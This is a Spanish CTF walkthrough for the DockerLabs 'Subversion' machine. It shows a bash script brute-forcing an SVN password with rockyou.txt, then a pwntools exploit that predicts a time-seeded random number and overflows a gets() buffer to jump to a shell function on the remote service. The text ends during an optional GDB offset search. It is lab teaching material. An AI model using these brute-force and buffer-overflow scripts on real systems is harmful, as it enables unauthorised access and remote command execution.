![Screenshot](/hard/Subversion/Images/machine.png)

Dificultad: **Hard**

Creado por: **Lenam**

# Pasos para pwn 🥽

* 👁️  [Reconocimiento](#reconocimiento)
* 🔍 [Enumeración](#enumeración)
* 🪓 [Explotación](#explotación)
* 🚩 [Escalada de Privilegios](#escalada-de-privilegios)

## 🛠️  Técnicas: Enumeración con gobuster, Crear nuestro exploit para SVN, extraer repositorio de svn, analizar binario, desarrollar un exploit para lograr un BoF y obtener acceso, transferir archivos con cat, escalar privilegios con tar y GTFObins.

---

Primero que nada nos aseguramos de que la máquina esté activa, podemos verificarlo rápidamente con el comando **ping**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/enumeration]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.247 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.085 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.135 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2031ms
rtt min/avg/max/mdev = 0.085/0.155/0.247/0.067 ms
```

Ahora, podemos comenzar nuestra fase de reconocimiento.

---
# Reconocimiento

Comenzamos esta fase siempre con **nmap**, para saber qué puertos están abiertos en la máquina objetivo.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/enumeration]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-02 21:41 -0500
Initiating ARP Ping Scan at 21:41
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 21:41, 0.10s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 21:41
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 1789/tcp on 172.17.0.2
Discovered open port 3690/tcp on 172.17.0.2
Completed SYN Stealth Scan at 21:41, 2.77s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000023s latency).
Scanned at 2026-02-02 21:41:12 -05 for 3s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON
80/tcp   open  http    syn-ack ttl 64
1789/tcp open  hello   syn-ack ttl 64
3690/tcp open  svn     syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.16 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- Con este argumento le decimos a nmap que escanee todos los puertos, comenzando desde el puerto 1, hasta el puerto 65,535.

**-n** <- Con este argumento nmap va a omitir la resolución DNS, esto es porque a veces en nuestros escaneos esto puede ser muy lento en algunos casos.

**-sS** <- Con este argumento nmap va a realizar un escaneo sigiloso, esto significa que el 3-way-handshake no se completará, y también hace el escaneo ligeramente más rápido.

**--min-rate 5000** <- Con este argumento nmap, enviará al menos 5000 paquetes por segundo, haciendo el escaneo aún más rápido.

**-Pn** <- Con este argumento nmap también omitirá la fase de descubrimiento de Host, esto significa que nmap tratará la máquina como activa y hará inmediatamente el escaneo.

**-vv** <- Con este argumento nmap nos mostrará los puertos abiertos descubiertos mientras el escaneo continúa, esto significa que si nmap descubre un puerto abierto inmediatamente nos lo reportará mientras el escaneo continúa.

**--open** <- Con este argumento le estamos diciendo a nmap que solo filtre los puertos abiertos.

Después de que el escaneo concluye podemos ver 3 puertos abiertos:

- puerto 80 (http / Hyper-Text Transfer Protocol)
- puerto 1789 (????)
- puerto 3690 (svn)

Pero necesitamos hacer otro escaneo con nmap, para saber más sobre estos puertos como qué servicios y versiones están corriendo, y encontrar posibles vulnerabilidades por versiones antiguas.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/enumeration]
└─$ nmap -n -p80,1789,3690 -sCV 172.17.0.2 -oX target --stats-every=1m
```

**-p80,1789,3690** <- Con este argumento nmap solo escaneará estos 3 puertos que descubrimos antes.

**-sCV** <- Con este argumento nmap va a escanear por cada puerto su versión para encontrar algunas posibles vulnerabilidades sobre sistemas no actualizados, y también hace un escaneo con algunos scripts que ejecuta nmap, para encontrar más sobre estos puertos.

**-oX target** <- Con este argumento guardamos toda la salida que nmap nos da y la guardamos como un archivo xml.

**--stats-every=1m** <- Con este argumento recibimos estadísticas del escaneo cada 1 minuto, esto puede tener minutos (m) y segundos (s)

Después de que el escaneo termina obtuvimos la salida en un archivo xml, hacemos esto para crear una página html para ver la información más fácilmente y más bonita de ver.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/enumerationn]
└─$ xsltproc target -o target.html
```

Con este comando convertimos el archivo xml a un archivo html, ahora vamos a abrirlo.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/enumeration]
└─$ open target.html 
```

Y podemos ver esto en nuestro navegador.

![Screenshot](/hard/Subversion/Images/image1.png)

Y podemos ver la información mucho más bonita y legible.

Podemos ver que el puerto 80 parece ser un sitio web.

También podemos ver que el puerto 3690 es un servidor Svn, esto significa que es como un repositorio "compartido" que podemos descargar si obtenemos el nombre de usuario y una contraseña.

Y por último el puerto 1789 podemos ver esto si nos conectamos con **netcat**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/enumeration]
└─$ nc 172.17.0.2 1789
Bienvenido a subversion!
Pregunta 1: ¿En qué año ocurrió la Revolución Francesa?
Respuesta: test
Respuesta incorrecta. No puedes continuar.
```

Podemos ver esto, pero no tan rápido, comencemos con el sitio web.

Comienzo con el sitio web con **whatweb** para encontrar qué tecnologías usa este servicio.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/enumeration]
└─$ whatweb http://172.17.0.2
http://172.17.0.2 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[172.17.0.2], Title[Subversión], nginx[1.18.0]
```

Podemos ver que está usando **Nginx** esto puede ser útil saberlo.

Bien ahora echemos un vistazo con nuestro navegador.

![Screenshot](/hard/Subversion/Images/image2.png)

Y podemos ver esto, nada interesante aquí, ni siquiera en el código fuente o en la imagen.

---
# Enumeración

Podemos usar **gobuster** para encontrar más recursos, directorios, o incluso archivos con esta herramienta.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/enumeration]
└─$ gobuster dir -u http://172.17.0.2 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 999]
upload               (Status: 200) [Size: 163]
```

**-x** <- Este parámetro podemos agregar extensiones que podemos intentar encontrar, en este caso estoy usando archivos php, html y txt.

Y encontramos upload en el sitio web.

```python
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/enumeration]
└─$ curl -s http://172.17.0.2/upload
¡Por aquí no es! ¿No viste al conejo? Iba con un mosquete y una boina revolucionaria... 
Pero con svnuser quizá puedas hacer algo en el repositorio subversion.
```

Parece una pista e información del repositorio y el usuario **svnuser**.

Podemos intentar conectarnos con el comando **svn** en nuestro sistema.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/files]
└─$ svn ls svn://172.17.0.2/subversion
Authentication realm: <svn://172.17.0.2:3690> a073d24b-9572-4dee-bc6c-1dd0b855a29c
Password for 'craft': *****

Authentication realm: <svn://172.17.0.2:3690> a073d24b-9572-4dee-bc6c-1dd0b855a29c
Username: admin
Password for 'admin': *****

Authentication realm: <svn://172.17.0.2:3690> a073d24b-9572-4dee-bc6c-1dd0b855a29c
Username: admin
Password for 'admin': ******** 

svn: E170013: Unable to connect to a repository at URL 'svn://172.17.0.2/subversion'
svn: E170001: Authentication error from server: Username not found
```

Podemos ver que necesitamos un nombre de usuario y contraseña válidos, por suerte para nosotros, ya tenemos un posible usuario **svnuser**.

---
# Explotación

Pero necesitamos obtener la contraseña de este usuario, podemos usar el siguiente comando para pasar el nombre de usuario y la contraseña directamente:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/files]
└─$ svn ls --username svnuser --password admin123 svn://172.17.0.2/subversion --non-interactive
svn: E170013: Unable to connect to a repository at URL 'svn://172.17.0.2/subversion'
svn: E170001: Authentication error from server: Password incorrect
```

Podemos usar esto para hacer un script de bash que va a intentar muchas contraseñas, y podemos usar el código de estado del comando con **$?**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/files]
└─$ svn ls --username svnuser --password admin123 svn://172.17.0.2/subversion --non-interactive
svn: E170013: Unable to connect to a repository at URL 'svn://172.17.0.2/subversion'
svn: E170001: Authentication error from server: Password incorrect
                                                                                
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/files]
└─$ echo $?
1
```

Podemos ver que el código de estado del comando anterior que fue ejecutado, es 1, este número o cualquier diferente de 0 es un error, así que si el comando es igual a 0 es exitoso, en otras palabras podemos intentar encontrar la contraseña con el código de estado.

Y este es el script de bash:

```bash
#!/bin/bash

green='\033[0;32m'
red='\033[0;31m'
cyan='\033[0;36m'
orange='\e[38;5;214m'
reset='\e[0m'

dictionary='/usr/share/wordlists/rockyou.txt'

ctrl_c () {
  echo -e "\n\n${red}[!] QUITTING...${reset}"
  exit 1
}

trap ctrl_c INT

while IFS= read -r pass; do
  echo -en "${orange}[*] Trying with: $pass             ${reset}\r"
  svn ls --username svnuser --password $pass svn://172.17.0.2/subversion --non-interactive \
    &>/dev/null

  if [ $? == 0 ]; then
    cmd="svn co --username svnuser --password $pass svn://172.17.0.2/subversion"
    echo -e "${green}[i] PWNED, the password is: $pass ${reset}"
    echo $cmd | xclip -sel clip
    echo -e "${cyan}[~] Command copied to the clipboard.${reset}"
    exit 0
  fi
done < $dictionary
```

Aquí vamos a introducir cada posible contraseña del archivo **rockyou.txt** en el comando, y si es exitoso obtenemos la contraseña y también el comando para descargar todo el repositorio copiado al portapapeles.

Ahora vamos a darle permisos de ejecución con **chmod**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/exploits]
└─$ chmod +x bruteforcer.sh
```

Bien ahora, ejecutemos el exploit.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/exploits]
└─$ ./bruteforcer.sh 
[i] PWNED, the password is: iloveyou!    
[~] Command copied to the clipboard.
```

¡Y después de algunos segundos, obtuvimos la contraseña del repositorio!

Ahora descarguemos todo su contenido.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/files]
└─$ svn co --username svnuser --password iloveyou! svn://172.17.0.2/subversion

A    subversion/subversion
A    subversion/subversion.c
Checked out revision 1.
```

Y obtuvimos el directorio del repositorio y todo su contenido dentro de él.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/files]
└─$ tree -a
.
└── subversion
    ├── subversion
    ├── subversion.c
    └── .svn
        ├── entries
        ├── format
        ├── pristine
        │   ├── 12
        │   │   └── 1242075dc6a8b2fda4658c141d0de7842b5793a2.svn-base
        │   └── 13
        │       └── 13db0bdacb79d74993c2f7d8cf0f683e3e29a698.svn-base
        ├── tmp
        ├── wc.db
        └── wc.db-journal

7 directories, 8 files
```

Podemos ver el ejecutable y también el código fuente del binario.

Usemos el comando file para saber más sobre este binario.

```r
┌──(craft㉿kali)-[~/…/dificil/subversion/files/subversion]
└─$ file subversion
subversion: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ed4c16c23b552a78bfdab6f2cb45655984b77ee9, for GNU/Linux 3.2.0, not stripped
```

Podemos ver que es un ejecutable de 64 bits y está **not stripped**, esto significa que podemos ver el nombre de las funciones, nombre de las variables que están siendo usadas en el binario.

Si ejecutamos el binario podemos ver esto:

```r
┌──(craft㉿kali)-[~/…/dificil/subversion/files/subversion]
└─$ ./subversion 
Bienvenido a subversion!
Pregunta 1: ¿En qué año ocurrió la Revolución Francesa?
Respuesta: 1789
Pregunta 2: ¿Cuál fue el nombre del movimiento liderado por Mahatma Gandhi en la India?
Respuesta: 
Respuesta incorrecta. No puedes continuar.
```

Se ve exactamente igual que el que está corriendo en la máquina objetivo en el puerto 1789.

Podemos ver qué protecciones están habilitadas en este binario con **checksec**.

```r
┌──(craft㉿kali)-[~/…/dificil/subversion/files/subversion]
└─$ checksec --file=subversion 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   80 Symbols        No    0               3               subversion
```

¡Incluso podemos inyectar shellcodes aquí! todo está deshabilitado.

Y las partes importantes de este código son las siguientes:

```c
void ask_questions() {
    char answer[256];
    int random_number;
    char number_str[5];

    // Semilla para el generador de números aleatorios basada en un XOR del tiempo y el numero 69
    srand(time(NULL) ^ 69);

    // Generar un número aleatorio entre 0 y 9999999
    random_number = rand() % 10000000;
```

Parece que genera un número **"aleatorio"**, y la semilla es el tiempo actual del sistema, y con esa semilla genera un número entre 0 y 9,999,999.

Esto es importante saberlo y podemos predecir esos números con python.

En computación no existe un número **"aleatorio"** real, parece que lo es, pero no lo es y esos números son llamados números **pseudo-aleatorios**, sigue un patrón y si conocemos la fórmula podemos predecir la misma secuencia de números por ejemplo, voy a hacer un número "aleatorio" con python e introducir la misma semilla usando las librerías de C:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/exploits]
└─$ python3 predictor.py 

[i] Choose a number (seed) --> 96
[!] The generated number is: 39201

[i] Choose a number (seed) --> 96
[!] The generated number is: 39201

[i] Choose a number (seed) --> 32445
[!] The generated number is: 68589
```

Aquí podemos ver que si introducimos el mismo número o semilla, genera un número **"aleatorio"**, pero no lo es, parece un número aleatorio pero si introducimos la misma semilla genera el mismo número.

Actúa como un generador pseudo-aleatorio de números y depende de la semilla, por eso podemos ver la misma secuencia si introducimos la misma semilla.

Y el código que vimos antes hace una semilla tomando el tiempo actual del sistema, si podemos ejecutar el binario y tomar exactamente el tiempo del sistema, esto es muy fácil con python y usando **pwntools**.

Bien y las siguientes 2 partes también son importantes:

```c
   int user_guess = atoi(answer);

    if (user_guess != random_number) {
        printf("Respuesta incorrecta. No puedes continuar.\n");
        return;
    }

    printf("¡Felicitaciones! Has adivinado el número secreto.\n");
    magic_text();
}

void magic_text() {
    char buffer[64];
    printf("Introduce tu \"mágico\" texto para continuar: ");
    gets(buffer); 
    printf("Has introducido: %s\n", buffer);
}
```

Si no introducimos el número correcto el binario nos expulsa.

Pero si introducimos el número correcto, entonces va a llamar a una función **magic_text** e introducir un texto en ella.

Podemos ver que está usando la función **gets** y esto puede llevar a un Buffer Overflow.

Y también en todo el código de C tenemos todas las respuestas de este binario.

Por último una función curiosa shell en el código.

```c
void shell() {
    system("/bin/bash");
}
```

Así que podemos hacer uso de esta función cuando causemos el BoF.

Así que voy a hacer un script de python que genera el número aleatorio e introduce todas las respuestas con un proceso usando **pwntools**.

```python
from pwn import *
import ctypes, time

def exploit():
    prc = process("../files/subversion/subversion")
    libc = ctypes.CDLL("libc.so.6")

    seed = int(time.time()) ^ 69
    libc.srand(seed)

    random_num = str(libc.rand() % 10000000).encode()

    prc.sendlineafter(b"Respuesta: ", b"1789")
    prc.sendlineafter(b"Respuesta: ", b"noviolencia")
    prc.sendlineafter(b"Respuesta: ", b"caidadelmuro")
    prc.sendlineafter(b"Respuesta: ", b"cartamagna")
    prc.sendlineafter(b"Respuesta: ", b"luchacontraelapartheid")
    prc.sendlineafter(b"Respuesta: ", random_num)

    output = prc.recvall(timeout=1).decode()
    print(output)

if __name__ == "__main__":
    exploit()
```

Y cuando lo ejecutamos podemos ver esto:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/exploits]
└─$ python3 exploit.py 
[+] Starting local process '../files/subversion/subversion': pid 4890
[+] Receiving all data: Done (97B)
[*] Stopped process '../files/subversion/subversion' (pid 4890)
¡Felicitaciones! Has adivinado el número secreto.
Introduce tu "mágico" texto para continuar:
```

Finalmente podemos entrar a esta función y causar un BoF, ya conocemos el tamaño del buffer en esta función que es de 64 bytes.

Para sobrescribir RIP (Instruction Pointer) y dirigir el flujo del programa a donde queramos, en 64 bits, los registros tienen espacios de 8 bytes, el 1er registro que está después de este buffer es **RBP** (Frame pointer / Stack Base pointer) y después de este registro viene RIP (Instruction Pointer) y esto es lo que queremos sobrescribir porque si podemos hacerlo, podemos dirigir el programa a cualquier parte del código, si recuerdas PIE está deshabilitado, así que todas las direcciones internas de este binario serán estáticas incluso si ASLR (Address Space Layout Randomization) está habilitado (2).

Así que para sobrescribir RIP necesitamos un total de 72 bytes antes de sobrescribirlo.

Si recuerdas ya tenemos una función que es **shell**.

Podemos usar **objdump** para encontrar la dirección de esta función y sus instrucciones.

```r
┌──(craft㉿kali)-[~/…/dificil/subversion/files/subversion]
└─$ objdump subversion -d -M intel 
.........
00000000004017ac <shell>:
  4017ac:       f3 0f 1e fa             endbr64
  4017b0:       55                      push   rbp
  4017b1:       48 89 e5                mov    rbp,rsp
  4017b4:       48 8d 3d a0 0b 00 00    lea    rdi,[rip+0xba0]        # 40235b <_IO_stdin_used+0x35b>
  4017bb:       e8 40 f9 ff ff          call   401100 <system@plt>
  4017c0:       90                      nop
  4017c1:       5d                      pop    rbp
  4017c2:       c3                      ret
  4017c3:       66 2e 0f 1f 84 00 00    cs nop WORD PTR [rax+rax*1+0x0]
  4017ca:       00 00 00 
  4017cd:       0f 1f 00                nop    DWORD PTR [rax]
.........
```

Así que podemos saltar a la dirección de la instrucción `lea    rdi,[rip+0xba0]` que es **0x4017b4** que es la dirección de esa instrucción, y ahí es donde pertenece la cadena **/bin/bash** que está siendo guardada en **RDI**, y luego ejecutar system y obtener una shell.

Ahora cambiemos una vez más el exploit para saltar directamente a esta instrucción.

```python
from pwn import *
import ctypes, time

def exploit():
    prc = process("../files/subversion/subversion")
    libc = ctypes.CDLL("libc.so.6")

    seed = int(time.time()) ^ 69
    libc.srand(seed)

    random_num = str(libc.rand() % 10000000).encode()

    prc.sendlineafter(b"Respuesta: ", b"1789")
    prc.sendlineafter(b"Respuesta: ", b"noviolencia")
    prc.sendlineafter(b"Respuesta: ", b"caidadelmuro")
    prc.sendlineafter(b"Respuesta: ", b"cartamagna")
    prc.sendlineafter(b"Respuesta: ", b"luchacontraelapartheid")
    prc.sendlineafter(b"Respuesta: ", random_num)

    shell = p64(0x4017b4)
    offset = 72

    payload = b"A"*offset + shell

    prc.sendlineafter(b"continuar: ", payload)
    prc.interactive()

if __name__ == "__main__":
    exploit()
```

Bien entonces ejecutemos el exploit y veamos si funciona...

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/exploits]
└─$ python3 exploit.py 
[+] Starting local process '../files/subversion/subversion': pid 6525
[*] Switching to interactive mode
Has introducido: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb4\x17@
$ whoami
craft
$ id
uid=1000(craft) gid=1000(craft) groups=1000(craft),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),116(bluetooth),121(lpadmin),124(wireshark),135(kaboxer)
```

¡Y finalmente podemos ejecutar comandos!

Así que para explotar este binario en la máquina objetivo necesitamos cambiar pocas líneas.

```python
from pwn import *
import ctypes, time

target = "172.17.0.2"
port = 1789

def exploit():
    prc = remote(target, port)
    libc = ctypes.CDLL("libc.so.6")

    seed = int(time.time()) ^ 69
    libc.srand(seed)

    random_num = str(libc.rand() % 10000000).encode()

    prc.sendlineafter(b"Respuesta: ", b"1789")
    prc.sendlineafter(b"Respuesta: ", b"noviolencia")
    prc.sendlineafter(b"Respuesta: ", b"caidadelmuro")
    prc.sendlineafter(b"Respuesta: ", b"cartamagna")
    prc.sendlineafter(b"Respuesta: ", b"luchacontraelapartheid")
    prc.sendlineafter(b"Respuesta: ", random_num)

    shell = p64(0x4017b4)
    offset = 72

    payload = b"A"*offset + shell

    prc.sendlineafter(b"continuar: ", payload)
    prc.interactive()

if __name__ == "__main__":
    exploit()
```

¡Bien ahora ejecutemos el exploit entonces!


```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/exploits]
└─$ python3 exploit.py
[+] Opening connection to 172.17.0.2 on port 1789: Done
[*] Switching to interactive mode
Has introducido: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb4\x17@
bash: /root/.bashrc: Permission denied
luigi@20ea2b07912f:/$ $ whoami
luigi
luigi@20ea2b07912f:/$ $ id
uid=1000(luigi) gid=0(root) groups=0(root)
luigi@20ea2b07912f:/$ $
```

¡Y obtenemos acceso como el usuario **luigi** en el sistema!

### Paso Extra (opcional)

Si no obtenemos el código fuente oficial del binario, podemos usar **GDB**, y también **radare2** estas dos increíbles herramientas de reversing van a ser muy útiles, para encontrar el buffer de la parte vulnerable (magic_text).

¿Cómo podemos hacerlo?

En la parte de puras preguntas no es vulnerable, la parte vulnerable es la función **magic_text**.

¿Y cómo podemos llegar ahí con **GDB**?

Es muy difícil, porque necesitamos adivinar el número aleatorio antes de saltar a la función vulnerable, recuerda que necesitamos adivinar un número aleatorio entre 0 y 9,999,999 y es muy improbable adivinar el número correcto.

Pero aún tenemos una manera de omitir esta restricción.

Imagina esto, la parte que nos jode, es esta:

```c
if (user_guess != random_number) {
	printf("Respuesta incorrecta. No puedes continuar.\n");
	return;
}
```

Aquí si introducimos **cualquier** número diferente del número aleatorio, el programa va a saltar a este condicional.

¿Pero si cambiamos esto?

```c
if (user_guess == random_number) {
	printf("Respuesta incorrecta. No puedes continuar.\n");
	return;
}
```

¿Puedes ver la diferencia?

Estamos cambiando el operador a **== (igual)** en lugar de **!= (no igual)**.

Así que si introducimos cualquier número incorrecto omitimos esta restricción.

¿Y cómo podemos hacerlo?

Podemos hacer esto con **radare2** también con **IDA**, estoy usando radare para cambiar más rápidamente este binario.

Y con esto necesitamos entender código **assembly**, porque assembly y C son muy diferentes, puse el ejemplo de antes para entender que vamos a hacer ahora.

Así que cuando estamos modificando un binario es una buena práctica hacer una copia/respaldo de ese binario, porque a veces podemos cometer un error en el binario, y aún tenemos una recuperación de ese archivo.

```r
┌──(craft㉿kali)-[~/…/dificil/subversion/files/subversion]
└─$ cp subversion subversion.bkp
```

Aquí estoy haciendo una copia del binario subversion con la extensión **.bkp** esto no es importante saberlo, estoy usando esa extensión para saber cuál es la copia.

Ahora necesitamos usar **radare2** y también modificar instrucciones del binario.

```r
┌──(craft㉿kali)-[~/…/dificil/subversion/files/subversion]
└─$ r2 -A -w subversion
WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
INFO: Analyze all flags starting with sym. and entry0 (aa)
INFO: Analyze imports (af@@@i)
INFO: Analyze entrypoint (af@ entry0)
INFO: Analyze symbols (af@@@s)
INFO: Analyze all functions arguments/locals (afva@@@F)
INFO: Analyze function calls (aac)
INFO: Analyze len bytes of instructions for references (aar)
INFO: Finding and parsing C++ vtables (avrr)
INFO: Analyzing methods (af @@ method.*)
INFO: Recovering local variables (afva@@@F)
INFO: Type matching analysis for all functions (aaft)
INFO: Propagate noreturn information (aanr)
INFO: Use -AA or aaaa to perform additional experimental analysis
[0x004011b0]>
```

Con el argumento **-w** le estamos diciendo a radare que vamos a hacer algunos cambios, porque si no lo hacemos no podemos hacer cambios en el binario, pero aún podemos habilitarlo con el comando **oo+**

Y el comando **-A** básicamente analiza todos los símbolos, entradas, llamadas a funciones, etc. como el comando **aaa (analyze all automatically)**.

Para mostrar todas las funciones podemos introducir el comando **afl (listen all functions)**

```r
[0x004011b0]> afl
0x004010f0    1     11 sym.imp.puts
0x00401100    1     11 sym.imp.system
0x00401110    1     11 sym.imp.printf
0x00401120    1     11 sym.imp.srand
0x00401130    1     11 sym.imp.fgets
0x00401140    1     11 sym.imp.strcmp
0x00401150    1     11 sym.imp.time
0x00401160    1     11 sym.imp.gets
0x00401170    1     11 sym.imp.setvbuf
0x00401180    1     11 sym.imp.atoi
0x00401190    1     11 sym.imp.rand
0x004011a0    1     11 sym.imp.__ctype_b_loc
0x004011b0    1     46 entry0
0x004011f0    4     31 sym.deregister_tm_clones
0x00401220    4     49 sym.register_tm_clones
0x00401260    3     32 entry.fini0
0x00401290    1      6 entry.init0
0x00401840    1      5 sym.__libc_csu_fini
0x00401848    1     13 sym._fini
0x004012d9   17    864 sym.ask_questions
0x00401639    1     73 sym.magic_text
0x00401682   30    298 sym.normalize_input
0x004017d0    4    101 sym.__libc_csu_init
0x004011e0    1      5 sym._dl_relocate_static_pie
0x00401296    1     67 main
0x004017ac    1     23 sym.shell
0x00401000    3     27 sym._init
```

Y podemos ver muchas funciones, incluso la función shell que vimos antes.

La que necesitamos ver es **sym.ask_questions**, y para ver todo su código desensamblado podemos usar **pdf@sym.ask_questions (print disassembled function)**

![Screenshot](/hard/Subversion/Images/image3.png)

Podemos ver que la 1ra parte está haciendo todos los pasos necesarios para hacer la comparación de la entrada del usuario con el número aleatorio generado, más específicamente la instrucción:

- **cmp eax, dword [var_4h]**

Esta instrucción compara eax con un valor que está en la pila, muy probablemente ese es el número generado.

Así que en resumen eax -> entrada del usuario
var_4h -> número aleatorio (en la pila)

¿Qué hace **cmp**?

Básicamente solo resta los 2 operandos: eax - [var_4h]

O por ejemplo: 45,368 - 8,522,426

Y en el momento que hace esta instrucción activa algunos eflags en la CPU dependiendo del resultado.

Si el resultado es 0 el ZF (zero flag) se activa.

Y hay un poco más de eflags como: jne, jnz, jl, jg, etc....

¿Y por qué se activan estas banderas? porque la siguiente instrucción hace uso de estas banderas.

En este caso es la 2da parte:

- **je 0x401621**

Esta instrucción hace esto; verifica si el eflag ZF está activado, esto significa que si el resultado es igual a 0 entonces salta a la dirección 0x401621

En resumen todas esas instrucciones básicamente hacen esto:

```python
if user_input == random_number: SALTAR a 0x401621
```

¿Y cómo podemos cambiar esa instrucción?

Con **radare2** podemos escribir la instrucción y cambiar ese opcode a JNE (Jump If Not Equal) en lugar de JE (Jump If Equal)

En la 3ra parte de la imagen la flecha nos está mostrando dónde está ubicada esa instrucción (0x00401611)

Así que necesitamos cambiar donde está ubicado radare2

```r
[0x004011b0]> s 0x00401611
[0x00401611]>
```

Hacemos S(witch) la posición a la dirección de esa instrucción.

Y luego vamos a usar el siguiente comando:

```r
[0x00401611]> wa jne 0x401621
INFO: Written 2 byte(s) (jne 0x401621) = wx 750e @ 0x00401611
```

W(rite) a(ssembly) en esa dirección esa instrucción JNE y su dirección a saltar.

Ahora si salimos de radare2 y ejecutamos el binario podemos ver esto:

```r
┌──(craft㉿kali)-[~/…/dificil/subversion/files/subversion]
└─$ ./subversion
Bienvenido a subversion!
Pregunta 1: ¿En qué año ocurrió la Revolución Francesa?
Respuesta: 1789
Pregunta 2: ¿Cuál fue el nombre del movimiento liderado por Mahatma Gandhi en la India?
Respuesta: noviolencia
Pregunta 3: ¿Qué evento histórico tuvo lugar en Berlín en 1989?
Respuesta: caidadelmuro
Pregunta 4: ¿Cómo se llama el documento firmado en 1215 que limitó los poderes del rey de Inglaterra?
Respuesta: cartamagna
Pregunta 5: ¿Cuál fue el levantamiento liderado por Nelson Mandela contra el apartheid?
Respuesta: luchacontraelapartheid
Pregunta extra: Adivina el número secreto para continuar (entre 0 y 9999999):
Respuesta: 02432
¡Felicitaciones! Has adivinado el número secreto.
Introduce tu "mágico" texto para continuar: testing
Has introducido: testing
```

Podemos ver que absolutamente omitimos esta restricción con esa instrucción que escribimos antes.

Ahora podemos usar GDB para saber cuál es el offset de RIP antes de sobrescribir este registro.

```r
┌──(craft㉿kali)-[~/…/dificil/subversion/files/subversion]
└─$ gdb -q subversion
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 17.1 in 0.01ms using Python engine 3.13
Reading symbols from subversion...
(No debugging symbols found in subversion)
gef➤
```

Para encontrar directamente el offset de RIP, necesitamos crear un patrón, podemos hacer esto con gef directamente.

```r
gef➤  pattern create
[+] Generating a pattern of 1024 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaa ......
[+] Saved as '$_gef0'
```

Ahora copiamos este payload a nuestro portapapeles.

Y ejecutamos el programa e introducimos todas las respuestas.

```d
gef➤  r
Starting program: /home/craft/challenges/dockerlabs/dificil/subversion/files/subversion/subversion 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".
Bienvenido a subversion!
Pregunta 1: ¿En qué año ocurrió la Revolución Francesa?
Respuesta: 1789
Pregunta 2: ¿Cuál fue el nombre del movimiento liderado por Mahatma Gandhi en la India?
Respuesta: noviolencia
Pregunta 3: ¿Qué evento histórico tuvo lugar en Berlín en 1989?
Respuesta: caidadelmuro
Pregunta 4: ¿Cómo se llama el documento firmado en 1215 que limitó los poderes del rey de Inglaterra?
Respuesta: cartamagna
Pregunta 5: ¿Cuál fue el levantamiento liderado por Nelson Mandela contra el apartheid?
